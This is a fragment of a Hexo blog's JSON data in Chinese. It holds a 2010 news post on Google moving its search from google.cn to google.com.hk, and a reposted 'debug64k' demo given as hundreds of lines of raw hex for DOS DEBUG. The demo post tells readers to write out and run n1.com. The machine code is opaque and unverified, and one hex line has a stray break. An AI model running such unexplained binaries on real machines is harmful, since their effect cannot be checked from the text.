/>谷歌表示，该决定来自于谷歌美国总部，没有任何的谷歌中国员工参与该决定","slug":"谷歌关闭Google.cn-通过香港网站google.com.hk提供服务","published":1,"updated":"2023-04-22T05:38:45.160Z","_id":"clgrjlxl200a27opihfg1662d","comments":1,"layout":"post","photos":[],"link":"","content":"<p>谷歌关闭Google.cn 通过香港网站提供服务北京时间3月23日凌晨2点31分，google.cn自动跳转至google.com.hk，同时界面显示：“欢 迎来到谷歌搜索在中国的新家”。北京时  间3月23日凌晨3点07分，雅虎新闻频道援引美联社的报道称，谷歌将转移中国大陆的搜索引擎服务，但会继续保持在中国大陆的其它业务服务。<br /><br />google.cn自动跳转至google.com.hk <br /><br /><br />北京时间3月23日凌晨2点31分，google.cn自动跳转至google.com.hk，同时界面显示：“欢迎来到谷歌搜索在中国的新家”。<br /><br />另据网友反映，若此前用户设置的是谷歌的个性化界面，则在输入google.cn时，域名不会有跳转现象。<br /><br />UPDATE:谷歌声明：仍保留技术、销售办事处 <br /><br />北京时间3月23日凌晨3点07分，雅虎新闻频道援引美联社的报道称，谷歌将转移中国大陆  的搜索引擎服务，但仍会保留谷歌音乐、谷歌热榜、iGoogle等服务，以及在中国大陆的技术和销售办事处，以便为中国大陆的网民做技术支持服务以及继续  为中文版的搜索引擎做销售支持。但销售团队需要按照google.com.hk的有关事项行事。<br /><br />谷歌表示，该决定来自于谷歌美国总部，没有任何的谷歌中国员工参与该决定</p>\n","site":{"data":{}},"excerpt":"","more":"<p>谷歌关闭Google.cn 通过香港网站提供服务北京时间3月23日凌晨2点31分，google.cn自动跳转至google.com.hk，同时界面显示：“欢 迎来到谷歌搜索在中国的新家”。北京时  间3月23日凌晨3点07分，雅虎新闻频道援引美联社的报道称，谷歌将转移中国大陆的搜索引擎服务，但会继续保持在中国大陆的其它业务服务。<br /><br />google.cn自动跳转至google.com.hk <br /><br /><br />北京时间3月23日凌晨2点31分，google.cn自动跳转至google.com.hk，同时界面显示：“欢迎来到谷歌搜索在中国的新家”。<br /><br />另据网友反映，若此前用户设置的是谷歌的个性化界面，则在输入google.cn时，域名不会有跳转现象。<br /><br />UPDATE:谷歌声明：仍保留技术、销售办事处 <br /><br />北京时间3月23日凌晨3点07分，雅虎新闻频道援引美联社的报道称，谷歌将转移中国大陆  的搜索引擎服务，但仍会保留谷歌音乐、谷歌热榜、iGoogle等服务，以及在中国大陆的技术和销售办事处，以便为中国大陆的网民做技术支持服务以及继续  为中文版的搜索引擎做销售支持。但销售团队需要按照google.com.hk的有关事项行事。<br /><br />谷歌表示，该决定来自于谷歌美国总部，没有任何的谷歌中国员工参与该决定</p>\n"},{"title":"世界编程大赛的一等奖debug64k作品欣赏","date":"2010-04-16T15:06:00.000Z","_content":"世界编程大赛的一等奖debug64k作品欣赏                                                               我在网上看到的最美丽的debug，请注意是-----美丽转载：批处理之家<br />代码:<code>----------------------------------------------------------------------------------<br /></code><code>----------------------------------------------------------------------------------</code><br /><code>e100 33 f6 bf 0 20 b5 10 f3 a5 8c c8 5 0 2 50 68 13 1 cb e 1f  be a1 1 bf 0 1<br />e11b 6 57 b8 11 1 bb 21 13 89 7 4b 4b 48 79 f9 ad 86 e0 8b c8 bd ff ff  e8 20<br />e134 0 3d 0 1 74 1a 7f 3 aa eb f3 2d ff 0 50 e8 f 0 5a f7 d8 8b d8 26 8a  1 aa<br />e14f 4a 75 f9 eb de cb 57 bb 21 13 8b c1 40 f7 27 f7 f5 8b fb ba 11 1 4f  4f 4a<br />e168 39 5 7f f9 52 8b c5 f7 25 f7 37 2b c8 95 f7 65 2 f7 37 95 2b e8 fe e  fe<br />e181 10 79 6 c6 6 fe 10 7 46 d0 14 d1 d1 d1 e5 79 ec 5a b8 11 1 ff 7 4b  4b 48<br />e19b 3b d0 75 f7 5f c3 83 f7 83 a6 5d 59 82 cd b2 8 42 46 9 57 a9 c5 ca  aa 1b<br />e1b4 4f 52 b4 92 3f ab 6e 9e a8 1d c6 3 fc e 6a e7 ae bb 5f 7b 10 b8 b4  f7 8<br />e1cd e2 bf 36 4e 39 9d 79 29 3f a f9 36 52 16 fb 5 e8 e5 a6 c2 e9 b0 43  d3 a3<br />e1e6 cf d3 fd fd cb d1 4c 5e e0 63 58 86 bb 3e 9 c1 20 bc cc 91 a3 47 81  70 b3<br />e1ff d6 1a 9e c2 c9 12 e7 4e ad f4 5f e3 30 e9 9 39 d7 e8 f9 f4 d2 44 e8  d7 22<br />e218 be e2 ce 88 25 cf 30 4a a8 29 ae 3f 47 c6 2d 85 e9 73 54 13 b e6 e0  34 65<br />e231 e2 50 8a 89 18 5f ce 70 99 3 5f 42 bf eb 7 ae d0 ca 5 22 8d 22 a5  b7 f0<br />e24a 90 81 bc 7a bc dc 5 db c0 6a 2 e5 57 38 be 60 cb ac ba a5 3b 9d f1  77 38<br />e263 a6 84 d1 3c af 49 d8 6a 45 a2 76 60 21 12 c0 c2 44 f2 5e bb e5 37  a9 2b<br />e27b ec 4a 8c 4c f2 f7 a9 58 71 2b ba 6d d6 6a e5 60 46 e0 da e5 b9 90  e5 a3<br />e293 f7 7f 31 60 58 f0 c4 88 10 4e 3c a3 ee 4e 11 55 8f a 92 eb db ad 7a  9c f<br />e2ac db 5a 28 96 da 87 ae 91 91 2d e3 5e ea df 6 95 71 67 71 40 ce d1 2e  31 6d<br />e2c5 c1 9c d8 6a 76 9b 4a e8 36 44 d6 76 d 30 5 ff d4 1b ac 1f 32 65 31  bf 55<br />e2de 26 b a4 55 e1 5d 5e 16 ed 97 48 6c 77 fb 81 86 e f9 18 bd d4 f4 8b  de 1d<br />e2f7 ba d 47 75 3 89 4b 3e dc 27 86 1c d0 17 89 48 d1 a6 8d d4 2b 54 4e  8f b0<br />e310 2 e1 6b 1a 75 78 ea 21 91 13 c0 cf 78 a0 ab f3 35 c6 b4 c8 90 8d d7  45 e7<br />e329 c 5b a4 ba 52 10 64 f5 4a 50 b7 ec 46 22 15 23 84 30 81 5c df 61 5a  8f 67<br />e342 c4 63 57 6d f7 26 92 a3 1f e5 3 a5 0 54 41 8 48 7c 26 90 33 82 9c  91 b0<br />e35b ab 78 5d df 99 e0 b9 fc 5 36 ac d9 49 91 ab 20 a2 63 48 89 ce 5c 60  64 f0<br />e374 63 d9 a8 38 3b d3 e6 4c 8c 23 34 4e 20 51 93 5e 6d b4 7a 22 9b 4c  f2 d3<br />e38c c4 f8 3 6f 47 40 f4 f8 45 9b 83 f3 83 6 31 d0 0 17 82 83 dc 67 f9  62 77<br />e3a5 90 3b d9 ec f3 55 96 b8 d9 db 79 55 f1 e5 8c 5e f2 e5 2e b0 b 6e e2  81 25<br />e3be 93 8e b5 dd 5b 46 f9 af ed 6 12 cf c9 1d f0 f7 3b 16 2d c6 58 73 8d  e9 5f<br />e3d7 fd 5a b6 a1 94 4d 1a 8 ff eb b7 6 80 c7 86 83 b6 b9 fd 1c e0 c c3  2e a0<br />e3f0 2f b 3e 3 6b 29 e1 27 85 1c ea 6d df b3 a3 ed 65 4a 9a 59 3b 54 e  4b ae<br />e409 9e 27 f0 4d 3b c 4c 46 b7 e5 57 1b 1f 1f bb 80 86 f5 b7 ef 73 52 bf  2c c7<br />e422 ed a b7 81 2 f3 90 3e ee cc 6c eb f 38 1 6c 68 b1 d 45 78 b2 f f6  83 b0<br />e43c c4 33 df b1 d1 91 98 1e 81 a5 e2 59 9f f4 8c b6 72 8 a7 8c f6 e a3  b2 1f<br />e455 d9 d3 23 f0 7c 5e 5f 68 61 8b 45 da 1d 91 ec 8d 4e ea 1a 38 85 94  aa ac<br />e46d f2 4 f6 c4 e5 92 8e 9a 4e 83 e1 73 e8 cf 2a 5c 2b 7e f1 30 2 8a e6  28 1a<br />e486 3b ce bc 96 aa 7f eb 87 cd 8b 96 2d 9 59 7a a0 1a 43 62 9a 9e 4f ff  8e d9<br />e49f ce d6 a4 70 79 cd 65 fa 2e 92 14 29 f7 6c 74 4b 49 60 80 bb ff 41  bb 2d<br />e4b7 60 33 3f 98 77 9a 1 ee a6 a3 da bc ba e9 f3 72 f4 7c c3 59 2 a6 44  a4 c8<br />e4d0 c8 54 93 ce bd 69 bb b9 43 21 2c c4 ea 4a 5c 3f 75 60 f2 b4 91 ca 9  82 e3<br />e4e9 a e9 a6 20 b9 76 50 ed 47 e9 fe 6d 41 34 13 2f 28 2f 4e f4 da e 3c  78 6c<br />e502 b1 79 87 45 98 a4 d4 c3 b3 29 c2 4a 8b ed a6 54 e2 1b 31 62 60 ff  2c 1d<br />e51a 21 0 15 b2 4e 5c c 2 d 83 fa a2 f3 8a 5 12 72 4a c7 44 7c 91 d4 be b  a f2<br />e535 70 52 fb b4 a2 df 89 de ff c4 96 73 c9 c ed d3 c9 8e 5c dc 8e d1 3b  de 8c<br />e54e 53 a2 8b f9 e9 91 dd d6 df 6e 74 d1 dd 34 60 8f 9e 32 7f 3b ec 79  a3 83<br />e566 45 78 b4 2f 1c 50 7b 7a 97 b0 9d 2d c dd 8a 26 cd 7d 8c 4c 5a 8a 4c  f9 a4<br />e57f 11 f9 2c 6c 92 e9 b5 cb 56 89 8c be f6 64 fa 25 43 fa 6f e2 c8 3a  18 a8<br />e597 f0 e9 f4 c2 86 e6 2b 44 67 4a b9 34 9 ed 5f 33 42 62 d4 8a 1e 5b 31  67 cd<br />e5b0 3d 71 6d 83 fd 36 20 69 ea 1 c3 e6 e6 de 99 aa 7 11 5b 59 8a 1f 43  83 52<br />e5c9 ea 5d 8c 6a 69 c7 3 eb 4e 3b 88 a5 5f b1 6e 27 5f 3 5c 28 c 9b 6c  c3 f8<br />e5e2 e5 b9 d6 11 d6 8b fa 5c 8 c7 1 eb 45 db f3 6c 9f 16 46 61 51 ed df f  bb<br />e5fb c0 c4 1e 64 68 98 4 79 30 94 72 df d4 cd 1f 7f 72 c6 82 2e 79 47 4e  8c 4b<br />e614 a2 c7 e2 36 df 76 fd a4 b6 4e db 96 40 3b 8b b5 d4 85 64 c6 0 2c ad  9d 27<br />e62d 14 99 82 4b bc 9 fa 94 b5 db 7c 98 eb b 13 a7 b0 79 1d 7e c5 45 aa  20 49<br />e646 be ff 9d 64 0 5d c ec 6 5 ad f2 38 6b ed 7a d6 b2 c7 2e 6a a6 12 4b  ff 55<br />e660 20 3b a 77 f b9 0 9d 57 4a ad ce a4 d3 ff 1 4f fb 53 54 88 f 1 ed  4b 56<br />e67a 15 c8 dc 28 bf f2 72 d4 10 1f 99 42 69 9e 78 e2 47 82 93 31 d0 2d  be 9f<br />e692 93 93 9a 1b 80 c0 10 c 53 78 a0 26 2a 96 4f 74 4b 16 c7 9c 8d ad ac  fb 16<br />e6ab 15 c6 fd c9 a4 14 48 62 47 20 c9 41 ed 61 f8 9b f8 ff ba 39 50 65  87 ee<br />e6c3 bd ce 95 c0 fb a5 7e d8 cd 27 fd 2c 74 3 c1 1b 89 b9 51 d5 e3 da ef  9e 6<br />e6dc f0 aa a9 a7 fb 87 4c 5d cd ff 65 36 8c 73 6f 9 c6 78 9a b6 77 db df  81 68<br />e6f5 3b b8 ae 5d e1 af d4 e6 66 8c d6 a4 83 9f 37 3c 1 dc a2 a6 57 c2 20  1b 90<br />e70e 75 df cd a5 62 a5 36 79 fb 35 8a 9b b0 a0 a5 c3 37 6f 80 72 bc 52  30 8d<br />e726 9f 7a 64 d3 7 41 45 d8 68 97 f2 aa 1c a1 6c 7c 9d 32 7d ad 15 b1 53  e3 33<br />e73f 8a ed e9 49 d4 cf dc 96 22 37 36 11 9d 7f f0 4d e0 62 31 b1 c7 69  c4 79<br />e757 ac 20 1 e8 3c 6a 8c 32 cb 52 63 36 68 f4 10 2b 9c 21 4f df 5d 60 92  39 91<br />e770 e2 f9 c9 7d ca 48 3 3f 21 dd 6c f 23 2e 61 3a 9f ba c3 f9 4e 7 ea  ed ef<br />e789 71 4a 72 3a ed 23 3d 77 b5 ed d5 1d f6 a4 99 fa ef 98 dd 2 98 80 b6  7c a3<br />e7a2 62 96 7b 8e bf 7b 81 9f 9a ce 3f 12 40 2e 25 db 84 16 dd 2e 86 f f4  b2 7e<br />e7bb 5e b4 14 6a f3 29 b1 a4 57 d5 a8 17 6f 87 a4 74 5b 9b 17 79 f1 ec  33 c8<br />e7d3 f0 1d b2 7e a8 4d 95 7f 5f 9 d5 1a 5a 45 f4 41 c6 d 3f eb 66 2a c0  e8 5b<br />e7ec 3c bd 50 ad f1 53 9d 2e 45 9a d8 7d 2c 17 a8 6e 15 48 13 39 53 ed  3d 78<br />e804 ad f 3a 65 a3 3e 2e fa ca 7 94 4a 1f b4 d8 7e 47 8a 8e de e7 7e 34  c1 69<br />e81d 7f 6a aa 66 58 18 31 24 72 13 22 34 8a 56 36 87 df c2 d 8e 3f 71 a2  5f 25<br />e836 8b 8d 4 78 fd c9 45 d1 55 79 c1 9f 13 84 1b c8 5 db 95 d0 7c 64 96  20 51<br />e84f c4 e0 5e ee 47 8a 11 ac fb 9 e0 bb 40 db 86 84 12 93 b9 c9 f2 9c 63  47 c9<br />e868 eb ad 1 3e fa 6d 3f a 64 5b 58 56 27 f ca 5d e0 30 bc 3e 10 5d ec  17 28<br />e881 85 5 51 8e 95 a3 94 3a a8 f1 96 f2 f 29 5c 97 dc 47 db 9d 6c 63 e8  e7 f0<br />e89a e4 a 70 f8 f1 47 54 d3 2d 32 7c ef bb 9a b4 1b 0 2b d6 dd e7 30 b  a2 75<br />e8b3 c7 f5 d0 31 d7 d2 8a b0 ac 1c 6d 60 3a f7 c2 db 1e 6d 7 f6 8f 35 88  e5 7f<br />e8cc 3c 26 81 34 a0 32 a3 25 18 6e 73 b2 a0 f1 cb 86 61 e7 65 8b 76 98  19 6f<br />e8e4 c0 62 9b a3 cc 18 5e 40 12 97 2b d0 15 79 de 19 ea df 7a 59 2f b5  d7 39<br />e8fc 52 e2 6 f1 3 a0 a5 d9 1b 88 93 4d 30 c8 2d f5 db 55 ea 85 6f a 3f  dc bd<br />e915 57 15 6a a3 a3 3e 8e ad 2d da a0 ca 75 7c 57 8b c5 cb b 1d 2c 8e c6  96 2e<br />e92e 6d 59 83 7d 64 72 ca 80 2e 6 a4 ff f6 f2 d5 1e 7 4 ba 34 6e 9 86 25  aa 4e<br />e948 e0 7f f5 32 47 3e 7c 43 d8 28 c4 1c 11 1d bd 33 3 b5 ca 13 43 34 2  b1 a0<br />e961 57 ed 9d 3c 23 d4 45 b2 6e 81 6e af 3e 67 90 be 59 a5 45 34 53 46  85 d1<br />e979 25 ee 7d cb a4 db 12 c3 aa 17 61 9a fb 66 40 76 fe 3a 69 96 c0 91  14 a7<br />e991 5d cc 9f f6 73 59 ee b8 55 97 20 26 ff 99 ec 72 41 b5 27 21 6e ae  8a d0<br />e9a9 e4 d3 da 6f c4 53 c5 f8 b3 a7 a1 5d 66 93 d8 b1 89 40 23 92 c0 90  fb cb<br />e9c1 e7 6b 4e 51 0 5d 57 f7 cd 1 e2 88 bf 44 9f ef c4 33 ce fa 46 46 a1  86 b<br />e9da 7a 84 66 66 b9 2 ec 10 c6 a1 d4 c1 18 33 b1 d1 2 18 ad 2f 53 e4 b9  33 59<br />e9f3 be 3c af 80 4\nc 8a d5 76 c 3b a7 e2 97 94 15 75 4d 17 d5 97 cf f9 4a  d0 6e<br />ea0c bb 27 20 fc f1 f5 9 a8 df 4d b6 5d f0 1d 69 3b 76 35 82 a4 f3 56 64  39 5b<br />ea25 6b b3 7 e7 5 8e 82 11 22 a8 1a db c8 3e 67 4a 3 7e 72 51 d6 3d 1a  1c f6<br />ea3e b8 da 4b 18 8a 15 9d d0 a4 84 96 3e cd 3 f9 3a 30 f3 fb 8f 6e 2 73  eb 52<br />ea57 93 95 cf dc 6f 48 fb ab d2 a9 70 b4 e2 23 8d 72 86 a8 fa 78 98 1d  c5 fe<br />ea6f 8a 51 88 2b b7 58 b0 ca ae 40 8a 33 32 75 1 6 c0 d4 b7 da 2a a7 bb  ad f7<br />ea88 48 98 5a bc d3 d1 e6 16 97 c3 80 ab 73 ac 32 11 41 1f d 5d aa 0 dc  d9 6e<br />eaa1 fc 30 6 ef 11 60 27 a2 5f eb 5f b9 35 8 23 4 be 10 c0 85 3e 55 b3  82 fd<br />eaba f7 c3 24 9f 2d 83 94 32 36 de ff 7c 87 7f 4a 80 7 2 23 cf a4 52 eb  3e 19<br />ead3 a0 b4 a 94 1a 40 58 d9 16 6d c0 64 c4 69 ed 60 46 65 cb df 58 38 0  51 c3<br />eaec ad a0 37 e4 cf ab f7 6c 24 7d 9 48 65 4a 9f 91 ad 1c 79 a4 a1 78 55  c e8<br />eb05 44 5b d ef 51 bd ea 2d a7 42 57 ab 3a 4f 2 b 3 19 6a 4d 72 76 5c 97  0 6c<br />eb1f c5 5d bc dd e7 81 cf 8d 34 38 50 3c 98 58 cc 41 aa 99 90 af fe 4e  96 77<br />eb37 ed 54 18 ce 2c d1 5d 34 cb 79 50 ff 28 96 44 e0 51 64 6 a8 b7 6e 8c  62 c4<br />eb50 66 95 81 4f 8c f6 26 ba ea 5d d2 79 b1 e4 e9 29 fc a fd b3 85 8c e6  52 dd<br />eb69 33 bd 5d c7 39 ef 6 ef 9e a6 6a 61 9c 9f d5 54 b4 fa a1 d4 10 9b ff  7e 33<br />eb82 11 52 99 c7 26 6e a1 36 8a ad ee 48 7a 2c 7f d5 b7 27 8a 6b 37 c 71  39 85<br />eb9b 9c ba a8 a 17 b9 d0 51 56 95 c2 3b 5 a7 31 c5 8b 5c 95 6e 4c 89 6f  17 ef<br />ebb4 d4 5a a 77 65 e1 49 b2 e8 72 ac 3c f0 6b 71 fa 3 c7 ca fc ad f9 55  22 ec<br />ebcd 58 2f 1c fa 29 cf 73 b4 ad 51 5c f8 66 70 59 5d 70 3e d1 3f c4 eb  ec f1<br />ebe5 7 78 6a 93 67 9f 44 fc cb 5b 95 ff 74 c0 b7 42 77 26 c9 aa 8c ed 39  a2 db<br />ebfe 9c b3 eb 3d 4a 1e 9b 89 e4 d8 a8 27 74 ef a3 ed a5 24 5d bb ab d0  fe a1<br />ec16 29 ab df 75 a a6 23 0 cc f1 14 72 9b 1a 55 7e e5 d1 da 98 dc c4 cf  ab 34<br />ec2f ba 8d de 4a 59 6 13 dd d8 44 3c e bb 56 95 ae 97 e2 3b 49 e5 9a 6b  a2 53<br />ec48 c1 33 35 24 1b 33 17 c3 8a 8c 12 3d 3d 4e 5b 75 22 30 67 4f a0 5d  3a 78<br />ec60 88 a 11 35 7 b1 77 42 32 a8 c3 bb 20 fb 98 5 d6 ac e7 3a 63 35 90  93 9e<br />ec79 44 24 2e 1b d7 8c aa 29 53 4d d9 ab eb e6 1 56 c4 fd 54 a3 bd 14 5b  b0 8f<br />ec92 ce be 23 24 93 c4 48 18 a3 e7 4 5 4b 78 cc 79 dd 3 56 a4 ed dd 5f  98 41<br />ecab 1b 68 4c c1 bb 41 c2 1e 3e 94 8e ef 28 1e b 76 e 4f 36 b1 c 6e e2  18 17<br />ecc4 20 fc 35 40 1f e4 6d a4 18 bb bc d5 9e ea 85 86 af af 63 d4 13 66  92 c4<br />ecdc 2b 69 84 ca 23 2b d3 66 81 6b 81 73 26 4 85 36 21 4c 49 44 75 64 39  16 3c<br />ecf5 ed e0 6d 44 75 45 30 43 68 c0 78 fc d0 17 b eb 81 3e c3 ba 1b f 4d  ae c5<br />ed0e 55 1f c 39 12 5d 8 65 f1 34 59 de dd 98 56 17 43 38 66 49 9a eb db  c1 87<br />ed27 51 38 cc b7 5f 98 fd 43 be 2d bb 74 f3 f8 f2 36 3d a4 34 a5 7e d2  26 cc<br />ed3f 84 1f ea 56 f0 80 18 69 4d 88 41 fc 56 fd 41 3b 1e e 9 27 4f f6 3b  62 4e<br />ed58 5a 1b 2a 4e 85 8c b2 4f 79 ef 59 4e e 73 3d bd c4 ca 60 e7 4a 47 90  b5 8<br />ed71 2a f0 4e dc ba 66 ae 48 2b 31 73 a2 11 c 32 ff 54 14 77 6b d6 58 4b  bf ee<br />ed8a f6 6a bc dd 1 88 d da a9 f 81 24 c5 f8 72 9a db d5 c8 2a 80 a9 16  d7 c6<br />eda3 b1 91 c0 a9 95 40 b5 b3 a8 2a 28 c6 92 16 ab 54 7d f8 93 5f 3a 17  c8 45<br />edbb a9 f0 e0 71 23 76 53 38 a5 a1 cc d4 f1 f2 3c 2b 46 43 a1 d5 ba e d7  19 7a<br />edd4 c2 e1 8f 67 1d d 98 9d a1 79 9d 1b 20 7f 4d e7 bf f9 ff fe aa 28 ab  8f c<br />eded 4d 50 33 e3 26 fc 3c 3 3a 2b 26 12 f7 1 8f ee 97 4c e6 6 2b d9 1f  a1 4a<br />ee06 77 44 d4 8b b7 3e 5e 2d 18 c3 54 68 99 a8 8d 92 96 9e 9d ab 33 38  ff b8<br />ee1e ee 78 c6 7b b5 84 95 d3 6 27 ae 5d 27 38 a 38 8e f0 1 a5 96 4b d7  9b 42<br />ee37 e5 6f 57 75 4c e9 78 2d 5b ec b6 d2 29 e2 a8 92 95 9c 65 2a 3e bf  8d e0<br />ee4f bf b3 ac c8 e 7e 13 af 88 26 7d 48 5a c7 39 29 36 d2 90 e8 3b 3 d0  61 1a<br />ee68 d2 e8 a8 f ba 8e a1 9f df 12 ab 54 7 23 98 de 62 af 4c 7e d4 fb 6b 2  6e<br />ee81 40 40 37 b7 73 f2 d8 81 be 29 d2 99 c0 73 25 1a 3c 92 75 6e bd d7  79 79<br />ee99 4 14 c0 4e 99 57 66 93 74 ec b0 29 7c df 61 b0 3 3a d1 c3 fa a4 f7 f  9f<br />eeb2 d3 f 0 b9 2a 5a 3a c5 88 25 b8 b9 cc 82 3 57 3a e1 7b 51 75 70 a6  74 1a<br />eecb ca cb 3 18 68 ca 77 fe 1b ad cd 68 7f 36 85 fc b7 4f a0 11 da 69 fa  79 87<br />eee4 d6 b9 21 dd 3e 70 db dc 84 d4 6e d1 20 4 af f6 32 a2 8e d 54 25 fe 7  54<br />eefd e 7a 74 4b a0 4b f7 f4 e8 74 22 e9 98 70 fb 25 2e f4 64 57 75 28 85  45 53<br />ef16 3a 2e e2 3c 54 36 e9 29 6 67 59 43 10 7e c1 49 cd 5e f9 97 a 58 5f  8a 11<br />ef2f 4f 3d 9a e2 2b 22 58 fa be fc 69 91 7a 8c 3f 77 9f c9 3b 54 26 23  93 b3<br />ef47 85 de ae f5 bd c5 47 4c c4 cd 5e ad bc 8f ba 31 f6 e4 70 fb 6e a7  96 d5<br />ef5f ad 10 80 39 43 97 4f 10 cc 1b 8f 8d cd 4c 63 4 d8 1e 85 70 41 6c a8  eb df<br />ef78 7f 36 c5 60 a7 12 9 16 73 fe 75 3a 2d 40 29 7d aa a 5c 2 29 23 0 a6  e5 6b<br />ef92 24 6d 9b 20 e5 7 cb 40 b0 38 59 9c a7 69 6a 70 d3 38 ef e2 b2 11 3e  ea 2a<br />efab f9 2b 2e 43 1d 65 cf d6 1b ef 83 5a 5f e6 c5 62 16 ca 5e 4c a6 39  e4 53<br />efc3 2d 23 d2 5e 7e 15 54 8a 8 b7 3d bb 88 59 b9 9e a2 7c 42 1f a2 77 3c  5b 9<br />efdc 6d fa 8f 21 46 1a 3e ed ce 49 56 1d 29 2d 70 3 a7 6f 75 ac 1 87 ff  27 86<br />eff5 73 49 28 85 2d 97 7a 84 e 37 3d 86 10 21 4c e2 74 62 6b 51 70 8f 15  72 f3<br />e100e 81 b2 a9 9d 8a 63 ad 1b d5 aa 8a dc 96 3c e7 47 16 51 fc 87 50 9  b7 60<br />e1026 29 33 52 fb b0 df 70 c5 65 4a 60 3b c d7 a8 29 47 51 f7 8a 77 f3  99 3f<br />e103e 38 16 60 de 68 27 b2 24 7 62 a2 fd 40 86 b2 75 c3 3c 2f 3d fa 9 d9  a9 9a<br />e1057 71 3c ce 46 94 0 f9 bc 46 7f b8 2e 85 7f 7d d3 8d ea b4 63 81 59  10 bb<br />e106f 57 d0 b6 ab e1 83 74 1e 25 d5 73 78 18 b1 60 62 c f4 76 8d 17 d5  ed 23<br />e1087 23 e4 f6 32 64 5a 61 9 63 f6 92 57 d5 29 40 d6 3b ba 63 72 18 0 25  1b 7<br />e10a0 ee 7f 25 4a fa 6 74 19 46 e3 e8 89 7a c6 56 54 a7 43 13 4e bf 97  a5 6f<br />e10b8 99 2f ac 33 4d fa 58 3a 5a a a4 1a 74 62 c8 4f 3b 78 9 d7 ee 7e ee  2d 69<br />e10d1 30 40 ea 47 82 3b 85 8e 3 23 8f 74 4e 8 35 ab 74 4 1 57 d5 85 b1  6b 1e<br />e10ea f4 7d 1e d2 1e b3 fe f3 12 10 32 39 51 48 2d 6f e5 d3 a3 8c 8 8<br />g<br />rcx<br />fff<br />n1.com<br />w<br />q<br />----------------------------------------------------------------------------------<br /></code><code>----------------------------------------------------------------------------------</code>把上面的代码保存为debug111.txt<br />再运行 ---》debug&lt;debug111.txt<br />你将看到什么？去看看吧&#160;&#160;<br />key“alt +enter” is to stop screen<br />然后结束进程就可以了。<br />这代码真的很变态，太强悍了、","source":"_posts/世界编程大赛的一等奖debug64k作品欣赏.md","raw":"title: 世界编程大赛的一等奖debug64k作品欣赏\ncategories: [Windows,操作系统]\ntags: []\ndate: 2010-04-16 23:06:00\n---\n世界编程大赛的一等奖debug64k作品欣赏                                                               我在网上看到的最美丽的debug，请注意是-----美丽转载：批处理之家<br />代码:<code>----------------------------------------------------------------------------------<br /></code><code>----------------------------------------------------------------------------------</code><br /><code>e100 33 f6 bf 0 20 b5 10 f3 a5 8c c8 5 0 2 50 68 13 1 cb e 1f  be a1 1 bf 0 1<br />e11b 6 57 b8 11 1 bb 21 13 89 7 4b 4b 48 79 f9 ad 86 e0 8b c8 bd ff ff  e8 20<br />e134 0 3d 0 1 74 1a 7f 3 aa eb f3 2d ff 0 50 e8 f 0 5a f7 d8 8b d8 26 8a  1 aa<br />e14f 4a 75 f9 eb de cb 57 bb 21 13 8b c1 40 f7 27 f7 f5 8b fb ba 11 1 4f  4f 4a<br />e168 39 5 7f f9 52 8b c5 f7 25 f7 37 2b c8 95 f7 65 2 f7 37 95 2b e8 fe e  fe<br />e181 10 79 6 c6 6 fe 10 7 46 d0 14 d1 d1 d1 e5 79 ec 5a b8 11 1 ff 7 4b  4b 48<br />e19b 3b d0 75 f7 5f c3 83 f7 83 a6 5d 59 82 cd b2 8 42 46 9 57 a9 c5 ca  aa 1b<br />e1b4 4f 52 b4 92 3f ab 6e 9e a8 1d c6 3 fc e 6a e7 ae bb 5f 7b 10 b8 b4  f7 8<br />e1cd e2 bf 36 4e 39 9d 79 29 3f a f9 36 52 16 fb 5 e8 e5 a6 c2 e9 b0 43  d3 a3<br />e1e6 cf d3 fd fd cb d1 4c 5e e0 63 58 86 bb 3e 9 c1 20 bc cc 91 a3 47 81  70 b3<br />e1ff d6 1a 9e c2 c9 12 e7 4e ad f4 5f e3 30 e9 9 39 d7 e8 f9 f4 d2 44 e8  d7 22<br />e218 be e2 ce 88 25 cf 30 4a a8 29 ae 3f 47 c6 2d 85 e9 73 54 13 b e6 e0  34 65<br />e231 e2 50 8a 89 18 5f ce 70 99 3 5f 42 bf eb 7 ae d0 ca 5 22 8d 22 a5  b7 f0<br />e24a 90 81 bc 7a bc dc 5 db c0 6a 2 e5 57 38 be 60 cb ac ba a5 3b 9d f1  77 38<br />e263 a6 84 d1 3c af 49 d8 6a 45 a2 76 60 21 12 c0 c2 44 f2 5e bb e5 37  a9 2b<br />e27b ec 4a 8c 4c f2 f7 a9 58 71 2b ba 6d d6 6a e5 60 46 e0 da e5 b9 90  e5 a3<br />e293 f7 7f 31 60 58 f0 c4 88 10 4e 3c a3 ee 4e 11 55 8f a 92 eb db ad 7a  9c f<br />e2ac db 5a 28 96 da 87 ae 91 91 2d e3 5e ea df 6 95 71 67 71 40 ce d1 2e  31 6d<br />e2c5 c1 9c d8 6a 76 9b 4a e8 36 44 d6 76 d 30 5 ff d4 1b ac 1f 32 65 31  bf 55<br />e2de 26 b a4 55 e1 5d 5e 16 ed 97 48 6c 77 fb 81 86 e f9 18 bd d4 f4 8b  de 1d<br />e2f7 ba d 47 75 3 89 4b 3e dc 27 86 1c d0 17 89 48 d1 a6 8d d4 2b 54 4e  8f b0<br />e310 2 e1 6b 1a 75 78 ea 21 91 13 c0 cf 78 a0 ab f3 35 c6 b4 c8 90 8d d7  45 e7<br />e329 c 5b a4 ba 52 10 64 f5 4a 50 b7 ec 46 22 15 23 84 30 81 5c df 61 5a  8f 67<br />e342 c4 63 57 6d f7 26 92 a3 1f e5 3 a5 0 54 41 8 48 7c 26 90 33 82 9c  91 b0<br />e35b ab 78 5d df 99 e0 b9 fc 5 36 ac d9 49 91 ab 20 a2 63 48 89 ce 5c 60  64 f0<br />e374 63 d9 a8 38 3b d3 e6 4c 8c 23 34 4e 20 51 93 5e 6d b4 7a 22 9b 4c  f2 d3<br />e38c c4 f8 3 6f 47 40 f4 f8 45 9b 83 f3 83 6 31 d0 0 17 82 83 dc 67 f9  62 77<br />e3a5 90 3b d9 ec f3 55 96 b8 d9 db 79 55 f1 e5 8c 5e f2 e5 2e b0 b 6e e2  81 25<br />e3be 93 8e b5 dd 5b 46 f9 af ed 6 12 cf c9 1d f0 f7 3b 16 2d c6 58 73 8d  e9 5f<br />e3d7 fd 5a b6 a1 94 4d 1a 8 ff eb b7 6 80 c7 86 83 b6 b9 fd 1c e0 c c3  2e a0<br />e3f0 2f b 3e 3 6b 29 e1 27 85 1c ea 6d df b3 a3 ed 65 4a 9a 59 3b 54 e  4b ae<br />e409 9e 27 f0 4d 3b c 4c 46 b7 e5 57 1b 1f 1f bb 80 86 f5 b7 ef 73 52 bf  2c c7<br />e422 ed a b7 81 2 f3 90 3e ee cc 6c eb f 38 1 6c 68 b1 d 45 78 b2 f f6  83 b0<br />e43c 